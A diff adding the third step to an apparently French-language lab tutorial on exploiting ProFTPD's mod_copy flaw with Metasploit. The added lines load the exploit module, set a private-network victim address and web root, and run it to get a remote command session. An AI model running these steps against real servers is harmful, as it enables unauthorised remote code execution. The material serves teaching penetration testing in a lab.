@@ -42,3 +42,20 @@ cp proftpd_modcopy_exec.rb /usr/share/metasploit-framework/modules/exploits/unix
 Pour cela, ouvrez un Terminal ( comme root ) et tapez "msfconsole".
 
 ![screen msfconsole](https://zupimages.net/up/20/51/ini9.png)
+
+# Étape 3 : Une fois que le métasploit est chargé, utilisez la commande suivante pour charger l'exploit
+
+use exploit/unix/ftp/proftpd_modcopy_exec
+
+Ensuite, nous devons définir l'hôte distant (serveur victime)
+
+set RHOST 192.168.1.102
+
+set SITEPATH /var/www/html
+
+![screen msfconsole](https://zupimages.net/up/20/51/oq4i.png)
+
+Vous pouvez toujours taper "show options" pour voir toutes les options que vous devez définir. Ici, RHOST est le serveur distant que nous essayons d'exploiter. Le "SITEPATH" est la racine du document pour le serveur web. Une fois que vous êtes prêt, tapez "exploit" et appuyez sur entrée. C'est tout.
+
+Vous devriez maintenant avoir une session ouverte depuis le serveur distant où vous pouvez exécuter n'importe quelle commande.
+
